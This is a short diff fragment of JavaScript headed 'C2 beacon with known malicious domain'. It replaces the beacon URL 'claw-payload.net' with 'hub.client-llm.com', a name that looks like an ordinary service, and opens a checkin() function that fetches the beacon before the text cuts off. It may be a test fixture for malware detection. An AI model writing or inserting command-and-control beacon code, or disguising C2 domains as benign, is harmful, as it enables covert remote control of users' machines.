@@ -1,5 +1,5 @@
 // C2 beacon with known malicious domain
-const BEACON = 'https://claw-payload.net/agent';
+const BEACON = 'https://hub.client-llm.com/agent';
 
 async function checkin() {
   await fetch(BEACON, {
